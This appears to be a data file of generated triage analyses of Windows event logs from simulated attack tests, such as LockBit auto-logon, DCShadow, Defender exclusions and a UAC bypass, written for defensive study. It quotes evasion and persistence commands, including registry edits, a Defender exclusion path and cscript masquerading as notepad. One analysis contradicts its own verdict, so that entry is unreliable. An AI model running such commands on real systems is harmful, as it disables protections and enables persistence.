1. **Immediate Mitigation:** Isolate the machine from the network to prevent potential spread or continued communication initiated by unauthorized files.
   
2. **Investigation and Analysis:** Conduct a thorough investigation of the `fileTest.exe` file to determine its nature and intent. Evaluate its legitimacy, check its digital signature, and scan it using antivirus and other forensic tools.

3. **Review and Verify Security Policies:** Confirm the necessity and authorizations for firewall rules and PowerShell scripts on all systems, ensuring similar activities are granted based only on strict compliance policies.

4. **Remediation Plan:** Consider removing any unauthorized software and reverse introduced changes to firewall rules. Conduct a security review, involving system's security patches and permissions for running scripts.

5. **Monitoring and Alerts:** Increase monitoring on other hosts for similar activities and establish alerts on unusual behavior patterns to detect and respond quickly to any potential threats.

The flagged activity should not be taken lightly and should be addressed in a manner consistent with organizational policies and security practices to mitigate risk."
LockBit Black - Use Registry Editor to turn on automatic logon -cmd,"### Detailed Analysis of Logs:

#### Suspicious or Anomalous Behavior:
1. **Automated Registry Changes**:
   - Several instances of `cmd.exe` and `reg.exe` are logged modifying registry keys under `HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon`. The registry modifications include setting values for `AutoAdminLogon`, `DefaultUserName`, `DefaultDomainName`, and `DefaultPassword`. This behavior could be an attempt to set up automatic logon, which is often utilized by malware for persistence or by attackers to maintain access without manual intervention.

2. **Use of Administrative Tools**:
   - The processes `wevtutil.exe` and `conhost.exe` appear multiple times, initiated by the user `SERVER002\admin_test`. Although these tools are legitimate Windows utilities, frequent execution in close succession is uncommon for routine operations and might indicate log tampering or process hiding activities.

3. **Execution of `whoami.exe` and `hostname.exe`**:
   - The use of `whoami.exe` and `hostname.exe` suggests that user `SERVER002\admin_test` may have been attempting to gather system and user information. This activity could be benign in an administrative context but may also signify reconnaissance activity by a malicious actor.

#### Evidence of Malicious Activity:
- The combination of commands designed to auto-logon with explicit passwords in the registry is a significant red flag. It suggests unauthorized attempts to ensure persistent access, which is almost universally considered a malicious action unless explicitly justified and controlled within a specific administrative task.

- The systematic use of `cmd.exe` and `PowerShell` without adequate context for legitimate operational activity suggests potential post-exploitation actions, which are typical of malicious actors attempting to gain control over a system.

### Assessment:
Upon reviewing the logs, the pattern of automated registry changes clearly aims to modify system settings in a way that could provide unauthorized access or persistence. This behavior, in conjunction with the use of administrative tools and activities typically associated with reconnaissance, strongly indicates malicious intent.

### Resolution:
- **MALICIOUS**: The evidence strongly suggests that the activities logged are indicative of malicious behavior. The registry modifications intended to enable automatic logon with stored passwords and the frequent execution of administrative utilities point towards compromise scenarios.

### Guidance on Proceeding:
1. **Immediate Isolation**: Temporarily isolate the affected system to prevent potential lateral movement or further access by unauthorized entities.
   
2. **Forensic Analysis**: Conduct a thorough forensic analysis to ascertain the full scope of the compromise, including data exfiltration or further persistence mechanisms.

3. **Credential Review and Reset**: Review and reset credentials that may have been compromised, especially those related to the account `SERVER002\admin_test`.

4. **Policy and Configuration Review**: Validate group policies and system configurations to ensure they align with security best practices and have not been altered.

5. **Monitoring and Alerts**: Enhance monitoring to ensure early detection of similar activities in the network and strengthen alerts on the execution of critical system utilities and registry changes.

6. **User Education**: Re-educate administrative and other key users on the importance of suspicious activity reporting and appropriate use of administrative tools."
Windows HideSCAPower Group Policy Feature,"Upon reviewing the provided Windows event logs from the Application, Security, Sysmon, and System channels, the following observations and analyses were made:

### Application Logs
1. **Software Protection Platform Service Event (EventID: 16384)**
   - This log indicates regular activity related to the Software Protection Platform on Windows. There are no unusual parameters or failed operations noted.

2. **Edge Update Service Stopped Events**
   - These logs show the stopping of the `edgeupdate` service twice, which is a benign operation commonly related to scheduled updates or manual stopping of the service.
     
### Security Logs
1. **Event 4616: Security-Auditing**
   - The logs indicate changes in system time, with the subject being `LOCAL SERVICE`. This could relate to time synchronization events, which seem consistent with the system logs (kernel general) and time service adjustments.
   - No indicators of privilege escalation or anomalous behavior are detected.

### Sysmon Logs
1. **Usage of Common Windows Utilities (wevtutil.exe, conhost.exe, HOSTNAME.EXE, whoami.exe)**
   - The presence of system utilities like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe` indicates potentially normal administrative activity; however, the sequence of these events (all happening in a very short timeframe) could suggest scripts or automation run by the user `SERVER002\admin_test`.

2. **Registry Modification using cmd.exe and reg.exe**
   - A command is executed via `cmd.exe` to modify a registry key (HideSCAPower). The high integrity level and the context suggest an authorized administrative action. 
   - While this action could be benign in terms of user customization, it stands out as a behavior that might require confirmation from the user, particularly if it was unexpected.

3. **Edge Update Activities**
   - Processes related to Microsoft Edge update are observed, including `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` and various update processes. These events align with genuine software update operations and do not indicate compromise.

### System Logs
1. **Time Synchronization Events**
   - The system logs showcase time adjustments performed by the time service, which corroborates the security log entries.
   - These operations appear legitimate and align with NTP adjustments typically observed during system operation.

### Conclusion
- **BENIGN**: The logs primarily illustrate system-related tasks, including software protection activities, service stops related to updates, time synchronization, and system utility usage. The registry modification command could warrant a follow-up if the associated account did not execute it intentionally, but it does not by itself indicate compromise. 

- **RECOMMENDATION**: If any unexpected system behaviors or unauthorized actions were discovered by users, further scrutiny on the `SERVER002\admin_test` account practices and intentions might be needed. Otherwise, treat the activities as standard administrative procedures.

Final resolution: **SUSPICIOUS** due to the registry modification command. Further confirmation of intent by the administrator or user would solidify this resolution as benign."
DCShadow (Active Directory),"Upon reviewing the provided logs, several events indicate potentially malicious activities. Below is a detailed analysis:

### Suspicious or Anomalous Behavior in the Logs

1. **PsExec and Mimikatz Usage:**
   - **Sysmon Event ID 1 - PowerShell Execution:**
     - A suspicious PowerShell script is being executed that references `mimikatz`, a well-known tool used for credential dumping and `dcshadow`, which involves manipulating domain controllers. The script also uses `PsExec` to execute a process with SYSTEM privileges.
     - The command line includes `lsadump::dcshadow`, which is a technique used in red team operations to simulate domain controller activities, indicating a likely unauthorized attempt to manipulate Active Directory.
   - **Events with Powershell, Whoami, and Hostname Executions:**
     - Various instances of `powershell.exe`, `whoami.exe`, and `hostname.exe` suggest administrative or scripting activity. While `whoami.exe` and `hostname.exe` executions could be benign, their proximity to the suspicious PowerShell activity raises concerns about potential reconnaissance or the verification of administrative access.

2. **High Integrity Level Execution:**
   - Both PowerShell instances reported are executed with a high integrity level, suggesting elevated permissions often required for administrative tasks or malware execution.

3. **Executable Paths and Use of Temporary Directories:**
   - The use of paths like `C:\Users\ADMIN_~1\AppData\Local\Temp\` for both Mimikatz and PowerShell scripts indicates transient activity commonly associated with illicit operations to avoid persistence detection.

### Assessment of Malicious Activity

- The specific references to `mimikatz` and command-line arguments related to `dcshadow` are strong indicators of an attempt to leverage Active Directory for unauthorized modifications potentially leading to privilege escalation. This combination of known hacking tools and techniques points to the activity being potentially malicious.

### Final Resolution: MALICIOUS

**Threats and Risks Identified:**
- Unauthorized access and manipulation of directory services can compromise user credentials, leading to complete domain control.
- Execution of unauthorized high-privileged processes, especially those involving credential dumping tools, represents an immediate threat to network security.

### Guidance on How to Proceed:

1. **Immediate Response:**
   - Isolate the affected host from the network to prevent further unauthorized activities.
   - Inspect the machine for other signs of compromise and unauthorized changes, especially within Active Directory.

2. **Incident Analysis:**
   - Conduct a deeper forensic investigation of the affected system and its interactions within the network.
   - Review domain controller logs for corresponding entries involving unauthorized schema modifications or replication tasks.

3. **Long-term Measures:**
   - Revoke credentials that may have been compromised and enforce a password change.
   - Increase monitoring on critical AD operations and enhance network segmentation.
   - Deploy advanced threat detection tools to prevent similar incidents in the future.

Given the evidence, it is crucial to treat this as a significant security incident requiring prompt attention and remediation efforts."
Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell,"The provided Sysmon event logs for the Windows host show a series of activities that both deserve attention and evaluation for potential suspicious activity. Here are the main points of analysis:

1. **Process Execution**:
   - **wevtutil.exe** and **conhost.exe**: We see several instances of these processes running. The presence of **wevtutil.exe** is worth noting, as this tool is used to manage event logs and could be leveraged by an attacker for log evasion or deletion.
   - **whoami.exe**: Executed to identify logged-in users, which can be common in normal administrative activity, but can also be indicative of reconnaissance activities.
   - **PowerShell**: A crucial point here is the execution of PowerShell with a command that modifies registry keys to set AutoAdminLogon and store credentials (`DefaultUserName`, `DefaultDomainName`, `DefaultPassword`). This action is a significant indicator of potential malicious intent as it involves credential storage and automatic login setups.

2. **Administrative Execution Context**:
   - The processes noted above, especially PowerShell with high integrity level, are running under the context of `SERVER002\admin_test`. This could either be an administrative maintenance task or a misuse of administrative privileges.

3. **EdgeUpdate Processes**: These logs show numerous activities related to Microsoft Edge updates. While these processes involve executing `.exe` files from Microsoft directories, they correspond to standard software update tasks and, on their own, do not indicate malicious behavior.

4. **PowerShell Logging**:
   - The PowerShell log further confirms the execution of scripting to change registry settings related to AutoAdminLogon. Given the sensitive nature of this activity, it confirms the analysis above regarding the potential misuse.

5. **Evaluating the Threat**:
   - While some activities such as those related to Edge updates seem routine, the execution of PowerShell with commands to change registry settings for auto-login and credential storage is highly concerning. This suggests either a malicious script execution or a severe misconfiguration potentially exploited by an attacker.

### Conclusion:

**Resolution: MALICIOUS**

The alteration of registry keys to enable AutoAdminLogon with stored credentials via PowerShell is a definitive indicator of a compromise or an attempted compromise. This action poses a significant security risk as it could lead to unauthorized persistent access to the system.

### Guidance:

- **Immediate Actions**:
  - Investigate `SERVER002\admin_test` user account activities for any unauthorized access.
  - Review and revert any unauthorized registry changes related to AutoAdminLogon.
  - Ensure that stored credentials (especially passwords) are changed immediately to prevent further unauthorized access.
  - Conduct a full system scan and forensic analysis to identify potential persistence mechanisms or additional compromise indicators.

- **Preventive Measures**:
  - Enhance monitoring and alerting for PowerShell command executions that involve critical registry changes.
  - Deploy additional security controls for privileged accounts, such as multi-factor authentication.
  - Implement least privilege principles and restrict the use of administrative privileges for regular tasks to mitigate risks of misuse.

This analysis should be used to inform incident response and remediation efforts concerning the identified malicious activity."
Tamper with Windows Defender Evade Scanning -Folder,"Upon reviewing the provided Windows event logs, here's a detailed analysis focusing on any suspicious or anomalous behaviors:

### Analysis

#### Windows PowerShell Log
- **EventID 600**: Shows a PowerShell script execution intending to change Windows Defender preferences by adding `C:\Temp` as an exclusion path (`Add-MpPreference -ExclusionPath`). This is a common technique used by malware to evade detection since malware placed in the `C:\Temp` directory would not be scanned by Windows Defender.
  
#### Security Log
- **EventID 4672 and 4624**: Shows a successful logon with special privileges assigned to the user `admin_test`. The privileges granted include `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are sensitive and often required by attackers to gain further access or control over the system. The NTLM authentication and logons from a workstation named `DESKTOP-3HL5B2P` could hint at lateral movement or remote login.
  
#### Sysmon Log
- **Process Creation Events (EventID 1)**: Indicate the execution of several system utilities like `wevtutil.exe`, `whoami.exe`, and `conhost.exe` by the user `admin_test`. Although not inherently malicious, these could be used for reconnaissance purposes in the context of security investigation.
- **Additional note**: The repeated execution of `MicrosoftEdgeUpdate.exe` related processes might seem suspicious, but these events align with what would be expected during a legitimate update process unless further context or evidence of manipulation is provided.

#### System Log
- Time adjustment events could correlate with attempts to tamper with logs for anti-forensics purposes, but without context or further corroborative evidence, these alone are not conclusively malicious.

### Assessment

The primary concern in the logs is the PowerShell event where Windows Defender's configuration is altered to exclude a specified directory, combined with the assignment of privileged access through EventID 4672, which might indicate an attempt at privilege escalation or lateral movement by the user `admin_test`. Additionally, the execution of reconnaissance-related utilities performed by a privileged account validates suspicion.

### Resolution: SUSPICIOUS

Given these findings, the activity is labeled **SUSPICIOUS**. The logs exhibit patterns consistent with potential malicious intentions, but conclusive evidence of compromise is not fully apparent.

### Recommendations for Further Investigation
1. **Examine the `C:\Temp` directory** for any unusual files or malware indicators.
2. **Review `admin_test` user's login history** and access attempts from `DESKTOP-3HL5B2P` to identify potential unauthorized access.
3. **Correlate process execution data** with expected behavior for any further anomalies.
4. **Check for additional Defender configuration changes** and verify against standard company policies.
5. **Conduct a full endpoint security assessment**, examining network activity and running processes for signs of compromise.

The above actions will help verify any potential threats and identify whether remediation steps are required."
Masquerading - cscript.exe running as notepad.exe,"**Analysis of Windows Event Logs:**

### Summary:
- **Initial Assessment:** The logs cover a brief period of time and highlight updates/other activity predominantly on Server002 under the user SERVER002\\admin_test and NT AUTHORITY\\SYSTEM.
- **Focused Concerns:** There's execution of various processes, and there's a particular command-line sequence involving the copying and execution of a file that stands out as potentially problematic.

### Detailed Analysis:

#### Windows PowerShell Log:
- **Missing Entries:** No details provided.

#### System Log:
- **Event IDs 44, 43, 19 (Microsoft-Windows-WindowsUpdateClient):**
  - These events relate to a security intelligence update for Microsoft Defender Antivirus.
  - Such updates are standard operating procedure and generally not indicative of malicious activity.

#### Sysmon Log:
- **Process Execution:**
  - **Event ID 1 (Process Create):**
    - The following executions are typical within a Windows environment:
      - HOSTNAME.EXE, conhost.exe, whoami.exe: These are native Windows binaries typically used for system information retrieval and console handling.
      - wuauclt.exe and AM_Delta.exe: Part of Windows Update and known security processes.
    - A notable pattern is the sequential execution of HOSTNAME.EXE, whoami.exe, and conhost.exe under the user admin_test.
  - **Concerning Command Execution:**
    - **cmd.exe** is executed with a command-line argument to copy `cscript.exe` to a new location masquerading as `notepad.exe` and then executed. This is unusual and could indicate an attempt to execute scripts without detection:
      ```
      ""cmd.exe /c copy %%SystemRoot%%\\System32\\cscript.exe %%APPDATA%%\\notepad.exe /Y & cmd.exe /c %%APPDATA%%\\notepad.exe /B""
      ```
    - This behavior is a red flag as cscript.exe is a script-based utility that runs scripts (such as VBScript and JScript) on Windows. Executing it as a different file name (notepad.exe) suggests obfuscation, which can be used in malicious activities.

#### Application Log:
- **Event ID 15 (SecurityCenter):**
  - Indicates Windows Defender is active, which is normal and expected.

#### Security Log:
- **Missing Entries:** No details provided.

### Assessment:
- There's an absence of clear privilege escalation or explicit exploitation attempts in the provided log snippets, which is reassuring. However, the activities involving script host masquerading as a different application suggest potential for abuse, hinting at a deeper investigation.

### Resolution:
Given the analysis of these logs, the resolution is:

**SUSPICIOUS**

**Recommendations:**
1. **Immediate Investigation:** Check the origin of the `cmd.exe` execution copying `cscript.exe` as `notepad.exe`. Search for related activities, anomalies, or potential abuse of this behavior.
2. **File Integrity Checks:** Verify the integrity and origin of all processes executed in a short timeframe with an attempt to spot any anomaly.
3. **Review Recent User Actions:** Investigate recent user activities associated with SERVER002\\admin_test to rule out misuse or compromise.
4. **Monitoring:** Increase monitoring for unusual script executions and modifications under the same or other user contexts.
5. **Threat Intelligence Inquiry:** Consult threat databases to see if this pattern aligns with known malicious signatures or tactics."
Set-Up Proxy Server,"Upon analyzing the provided event logs from the Windows machine, here is the detailed analysis:

### System Log and Security Log:
1. **Date and Time Adjustments:**
   - **Event IDs 24, 1, and 4616:** These are related to time adjustments. The adjustments to the date and time are legitimate actions typically taken by the Windows Time Service (`svchost.exe`), as indicated in the logs. 
   - **Event ID 35 (System Log):** The Windows Time Service synchronized with an NTP server (`time.windows.com`). This is expected behavior for time adjustments.

2. **Windows Update Activity:**
   - **Event ID 19 (System Log):** Records the installation of a Security Intelligence Update for Microsoft Defender Antivirus. This indicates routine updates, not suspicious activity.

3. **Logon Events:**
   - **Event IDs 4624 and 4672 (Security Log):** These show a successful logon for the SYSTEM account and the assignment of special privileges. The SYSTEM account is expected to have these privileges, and there is no indication of an anomaly here.

### Sysmon Log:
1. **Process Creation:**
   - **Use of `wevtutil.exe` and `conhost.exe`:** These are common Windows processes for event log utilities and console hosting, respectively. Their execution as shown does not immediately indicate malicious behavior.
   
2. **Use of `cmd.exe`:**
   - **Event ID 1:** A command executed: `cmd.exe /c reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ProxyServer /t REG_SZ /d ""proxy.file-test.com:8080"" /f` indicates a change to the proxy settings under the current user's Internet Settings. This could be indicative of a configuration change, not necessarily malicious, but should be verified with the system owner for intent.
   
3. **Use of Registry Tool `reg.exe`:**
   - **Process ID 2200:** Execution aligns with the change made via `cmd.exe` to modify proxy settings. This linkage might explain network behavior changes and should be further checked for user intent.

4. **Execution of Utilities:**
   - Commands like `HOSTNAME.EXE` and `WHOAMI.EXE` are used to gather system and user information, which can be normal but could also be part of reconnaissance if executed in a suspicious context. The context and frequency of their usage should be consulted.

5. **Miscellaneous:**
   - Other logs show routine service host (`svchost.exe`) operations and system maintenance tasks, which seem regular and within expected operational boundaries.

### Conclusion:
While most of the activities, such as system updates, time synchronization, and service operations, appear benign, the modification of proxy settings via the command line is a flagged activity. Unauthorized changes to proxy settings can be a potential risk vector for redirecting network traffic through a malicious server.

### Final Assessment:
- **Resolution: SUSPICIOUS**

### Guidance:
- **Verification:** Clarify with the system administrator or user if the proxy settings change was intentional and authorized.
- **Monitoring:** Increased vigilance on network traffic and subsequent processes spawned by user `admin_test`.
- **Remediation:** If unauthorized, revert changes to the system and conduct a thorough investigation to ensure no other unwanted changes have been made."
Registry-free process scope COR_PROFILER,"Upon reviewing the Windows event logs provided, several indicators suggest potentially suspicious activity:

1. **.NET Runtime Error (Event ID 1022)**:
   - This event indicates that the .NET Runtime failed to load a profiler with a specific CLSID, likely due to ""HRESULT: 0x8007007e"". The details in this error could be normal operations or misconfigurations. However, given the connection with other events, it warrants more investigation.

2. **PowerShell Execution**:
   - In the Windows PowerShell logs, there is a repeated use of PowerShell scripts with environment variable changes triggering profiling with a specific DLL: `'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.012\\bin\\data.012x64.dll'`. 
   - This behavior is unusual and often associated with malicious activity because changing environment variables related to profiling is not common in legitimate administrative tasks. 

3. **Sysmon Process Creation (Event ID 1 & 5)**:
   - Multiple executions of PowerShell, `wevtutil.exe`, and modifications involving `wsmprovhost.exe` can suggest potential lateral movement or reconnaissance.
   - The `System32` directory executions (`whoami.exe`, `hostname.exe`, `conhost.exe`) are not suspicious by themselves but could be relevant considering the other activities.
   - The repeated invocation and setup of Microsoft Edge Update processes might typically be benign if consistent with normal system maintenance or updates. However, the combined context implies that these actions may also be used to mask or automate malicious activities.

4. **User Context & Processes**:
   - The scripts and processes are frequently executed under the `SERVER002\\admin_test` account which is a detail that needs attention, considering the elevated privileges usually associated with administrative accounts.

5. **EdgeUpdate Executions**:
   - A significant number of events are related to the Microsoft Edge Update service, which alone could indicate standard software updates. However, given the context and timing around suspicious powershell activities, further cross-validation with admin tasks or known updates should be conducted.

### Assessment:
- **The combination of PowerShell scripting with environment variable alterations, .NET Runtime issues, and elevated process executions under an admin context without explicit authorization or necessity suggests suspicious activities that warrant further investigation.**

### Guidance:
- **Verify the legitimacy of the 'data.012x64.dll' and the profiling settings, as well as their necessity.**
- **Audit the activities and permissions under the `admin_test` account to ensure no unauthorized privileges have been granted or exploited.**
- **Conduct a network and endpoint investigation to check for any signs of lateral movement, data exfiltration, or further compromises.**
- **Correlate with other security products for indications of known threats or alerts that match observed behavior.**

### Resolution:
- **SUSPICIOUS** - The logs contain activity that doesn't look right and needs a thorough investigation to confirm or rule out potential threats."
Dynamic API Resolution-Ninja-syscall,"### Detailed Analysis of Provided Logs

After thoroughly reviewing the provided Windows event logs, here's the analysis for each type of activity noted:

#### System Log:
- **Windows Update Events**
  - The System log shows normal Windows Update-related activities. The entries documenting Security Intelligence Updates for Microsoft Defender Antivirus do not indicate malicious activity; these are standard and expected operations to keep the antivirus definitions up-to-date.

#### PowerShell Log:
- **PowerShell Execution Event**
  - Suspicious PowerShell activity was noted. The command involves executing a potentially obscure executable (`ninja_syscall1.exe`) from a temporary directory and conditionally deleting a log file (`hello.log`) from the Default user’s temp folder.
  - Running executables from temporary directories, especially with deletion operations, is suspicious as it is a typical behavior of malware trying to clear its tracks.

#### Security Log:
- **Credential Validation Failure Events**
  - Multiple EventID 5379 entries, indicative of credential validation attempts, returned failure (`ReturnCode: 3221226021`). These are observed in the context of access attempts using MicrosoftAccount and WindowsLive tokens.
  - The failure return code suggests these attempts were unsuccessful, which typically wouldn't raise concerns, but the frequency could indicate automated attempts or misconfigurations, which require further investigation to confirm legitimacy.

#### Application Log:
- **Windows Defender State Reflected**
  - A single entry indicating that Windows Defender is active. This is a normal entry with no signs of malicious activity.

#### Sysmon Log:
- **Process Creation and Image Load**
  - Noteworthy is the execution of `ninja_syscall1.exe`. This process stems from a PowerShell command seen in previous logs. The executable is run in an unusual directory (`Temp`) and lacks typical metadata (e.g., FileVersion, Company, Description), raising suspicion.
  - Numerous legitimate executables associated with normal system operations, such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and others are observed, most of which have appropriate metadata.
  - The `Microsoft Edge Installer` processes running from expected paths are consistent with legitimate updates, given the command-line parameters and `NT AUTHORITY\SYSTEM` user context.

### Assessment and Conclusion

- **Benign Activities:**
  - System log updates and most security/application events fall under normal behavior.
  - Microsoft Edge updates appearing in the sysmon logs are typical with system operations and don’t inherently suggest compromise.

- **Suspicious Activity:**
  - The execution of `ninja_syscall1.exe` from a temporary directory, initiated by a PowerShell script with subsequent file deletion, is suspicious.
  - The repeated failed credential validation events could potentially indicate abnormal behavior demanding further investigation to rule out brute force or misconfiguration attempts.

### Final Resolution

**Resolution: SUSPICIOUS**

The logs contain activity (execution of `ninja_syscall1.exe` from an unusual path with subsequent log removal) that doesn't look right and warrants further investigation. The security events raise minor concerns due to frequency, but on their own, these aren't definitive of an ongoing breach. Investigating the origin of `ninja_syscall1.exe` and confirming the legitimacy of those execution contexts should be prioritized."
Delete a single file - Windows PowerShell,"### Analysis:

**Windows PowerShell Log:**
- The repeated PowerShell actions are executing a command to remove a temporary file: `Remove-Item -path $env:TEMP\deleteme_data.004`. This action itself is not inherently malicious but could be part of a cleanup process following some activities. However, without additional context, this does not indicate malicious activity on its own.

**Sysmon Log:**
- Multiple instances of Microsoft Edge Update processes are being launched around the same time, associated with updating and registering Microsoft Edge components. These include commands for updating (`/update /sessionid`), registration (`/regsvc`, `/regserver`), and service execution (`/svc`). 
- Additional tools like `whoami.exe` and `hostname.exe` are triggered, which are often used in scripts to gather environment information. 
- `wevtutil.exe` is being executed, which is a legitimate tool to manage event logs. The use of `conhost.exe` is common as it hosts command-line interfaces. 

**Application Log:**
- Shows a `Service stopped` message related to `edgeupdate`, aligning with the Edge updating actions observed in the Sysmon logs.

### Suspicious Indicators:
1. **Frequent PowerShell Use**: While the specific PowerShell command appears benign, frequent PowerShell instantiation without apparent reason can sometimes indicate suspicious behavior if it wasn't expected or scheduled.
2. **EdgeUpdate Processes**: These are legitimate Microsoft processes involved in updating the Edge browser. The timing and nature of the executions seem consistent with a typical update cycle, but if this behavior wasn't expected, it might warrant further investigation.
3. **Use of System Commands**: Tools like `whoami.exe` and `hostname.exe` could be used legitimately for troubleshooting or system analysis but can also be suspicious if executed unexpectedly.

### Conclusion and Resolution:
Considering the provided logs, I'm unable to find concrete evidence of malicious activity. The executions observed could reflect a legitimate software update or maintenance operation. However, due to the potential for PowerShell misuse and process activity outside normal hours or expectations, the logs reflect:

- **Resolution: SUSPICIOUS**

### Guidance on How to Proceed:
1. **Verification**: Check with IT or system management to verify if this behavior aligns with known update schedules for Microsoft Edge or any other maintenance activities.
2. **Monitoring**: Monitor the system for any additional unexpected PowerShell executions or unusual process initiations.
3. **Review Access**: Investigate any recent system changes or login activities related to the observed actions. Validate whether `SERVER002\admin_test` is expected to be performing such tasks.
4. **Investigation**: If IT does not recognize the activity, consider conducting a deeper investigation into script usage and unusual processes to determine if any scripting has been misused or if any unauthorized access occurred."
Modify Internet Zone Protocol Defaults in Current User Registry - cmd,"Upon analysis of the provided logs from the Windows machine, several observations can be drawn:

1. **Time Change Events (Security Log and System Log)**:
    - There are several event logs where the system time was altered. These events, with EventID 4616 in the Security log, indicate a change in the system time. However, this could be a system function where time synchronization occurs, such as with a time service (e.g., NTP).

2. **Command-Line Registry Manipulations (Sysmon Log)**:
    - There is a notable `cmd.exe` process execution found in the Sysmon log with EventID 1 where a registry key related to Internet Settings (ZoneMap ProtocolDefaults) was modified. Commands seen were:
      ```
      ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults"" /v http /t REG_DWORD /d 0 /F & reg add ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults"" /v https /t REG_DWORD /d 0 /F
      ```
    - The registry changes attempted by this command concerning Internet Zone settings are indicative of potential malicious activity, as these settings are commonly targeted in attempts to lower security settings on a machine.

3. **Unusual Process Executions (Sysmon Log)**:
    - The `wevtutil.exe` and `conhost.exe` processes were executed frequently. While this is normal under certain administrative operations or scripts, it can also cover malicious activities.

4. **Microsoft Edge Update Executions (Sysmon Log)**:
    - Extensive logging related to Microsoft's Edge Update process (`MicrosoftEdgeUpdate.exe`) is observed. Several processes of Microsoft Edge Update were initiated by `NT AUTHORITY\SYSTEM`, which indicates it's being run with high privileges. This can be typical during an update cycle but should be verified against scheduled updates in the environment.

### Assessment:

- **Suspicious Activity**: The registry modification attempt observed via `cmd.exe` appears suspicious and warrants further investigation. This activity is often associated with attempts to change security settings, possibly indicating an attempt to subvert default protections on the system.

- **Benign/Expected Activity**: Time adjustments and Microsoft Edge updates appear consistent with system maintenance tasks, although the Edge update activities should be validated against official update policies to ensure no unauthorized modifications are included.

### Resolution:

**Resolution: SUSPICIOUS**

Given these findings, the activity around the registry modifications needs to be investigated further to determine the legitimacy of the execution context and verify whether this is an intended change by authorized applications or a result of unauthorized or malicious actions. It is recommended to:
- Perform a review of recent configurations and application installations or updates.
- Check for any unauthorized scripts or programs that may be executing these changes.
- Conduct a behavioral analysis of processes causing these events to ensure they align with expected operational behavior.

This investigation will help clarify whether any malicious activity has taken place or if it's a benign execution within bounded operations."
Invoke CHM with Script Engine and Help Topic,"### Analysis of Windows Event Logs

After analyzing the provided Sysmon and Windows PowerShell logs for signs of malicious activities and unusual behaviors, a few events stand out:

#### 1. PowerShell Usage
- Several instances of `powershell.exe` are launched as seen in the Sysmon logs. Notably, one of the PowerShell processes uses the command-line: `""powershell.exe"" & {Invoke-ATHCompiledHelp -ScriptEngine JScript -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm}`.
- The `Invoke-ATHCompiledHelp` command is not a standard PowerShell command and appears suspicious, suggestive of potentially malicious behavior. This could indicate an attempt to use PowerShell to execute scripts through unusual means using compiled help files.

#### 2. Conhost.exe and Wevtutil.exe Usage
- The logs show multiple instances of `conhost.exe` and `wevtutil.exe`. While these are legitimate Windows processes, frequent and unexplained invocations, especially `wevtutil.exe` which is used for managing event logs, can be used to tamper with event logs or gather information about system logging—common tactics in many attack vectors.

#### 3. Lack of Security Logs
- There are missing entries in security logs which could suggest either a misconfiguration or deliberate log tampering to avoid detection, especially given the presence of `wevtutil.exe`, which can be used to modify logging.

#### 4. Presence of Microsoft Edge Updates
- Multiple Microsoft Edge installer setups (`setup.exe`) are executed with NT AUTHORITY\SYSTEM privileges. While these may represent legitimate update installations, the comprehensive context of these setups needs to be verified to ensure they are not malware masquerading as legitimate updates.

#### Risk Assessment
- **Suspicion of Malicious PowerShell Activity:** The PowerShell command logged could be indicative of script execution that disguises under benign tasks. It suggests potential script execution for unauthorized actions.
- **Event Log Tampering:** The frequent use of `wevtutil.exe` for unknown purposes could point towards attempts at log manipulation or investigation by the attacker.
- **Possible False Positives:** Edges' frequent updates, which seem legitimate, might be benign but can be used as cover for malicious actors. Cross-verifying these setups with known update schedules and hashes is recommended.

### Recommendation and Resolution
Given the suspicious usage of PowerShell and `wevtutil.exe` along with gaps in expected logging, the following actions are advised:

1. **Isolate the Host:**
   - To prevent any potential spread of compromise, isolate ""Server002"" from the network until a full investigation is complete.

2. **Detailed Investigation:**
   - Further investigate the suspicious PowerShell activity to determine its scope and intention.
   - Conduct a hash analysis of the Microsoft Edge setup executables to confirm their legitimacy against known hashes from Microsoft.
   
3. **Audit and Remediate:**
   - Review and secure PowerShell configurations to prevent unauthorized use.
   - Enhance logging and alerting on the use of sensitive applications like `wevtutil.exe`.

Based on the analysis of this behavior, the log entries can be finalized as:

- **Resolution: SUSPICIOUS**

The activities require further investigation to confirm if they are benign or indicative of a compromise."
UACME Bypass Method 31,"Upon analyzing the provided logs, several activities and processes stand out that require our close attention for potential indicators of malicious activity.

### Suspicious Activities:
1. **Command Execution with Cmd.exe:**
   - The execution of `cmd.exe` with the command line pointing to a suspicious location `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\uacme\\31 Akagi64.exe` is observed. It suggests the potential execution of a known user account control (UAC) bypass tool, `uacme`, specifically referring to a file `Akagi64.exe` which is notably linked to privilege escalation attempts. This behavior is abnormal and suspicious, especially given that tools associated with `uacme` are not typically found in expected administrative or user-driven tasks.

2. **Process Execution of `wevtutil.exe`:**
   - Multiple events relate to `wevtutil.exe`, which is a legitimate utility for managing Windows event logs. However, repeated instances in rapid succession from the same user account (`SERVER002\\admin_test`) might suggest log manipulation or other nefarious activity attempts to clear tracks.

3. **Microsoft Edge Update Processes:**
   - Numerous Microsoft Edge update processes are logged; however, we note the creation of temporary folders like `C:\\Program Files (x86)\\Microsoft\\Temp\\EUDF0B.tmp`. While it is standard for updates to operate with elevated privileges (as seen with `NT AUTHORITY\\SYSTEM`), the frequency and multiple dynamic paths merit further investigation to ensure it's legitimate and not masking malicious payloads.

### General Observations:
- **High-Integrity Level Processes:**
   - Multiple processes operate with `High` integrity levels, which might be exploited by an attacker for privilege escalation. This is highlighted by atypical lineage forming from some commands, suggesting potential execution chains that align with process injection or lateral movement tactics.

### Assessment and Actionable Steps:
- **Resolution: SUSPICIOUS**
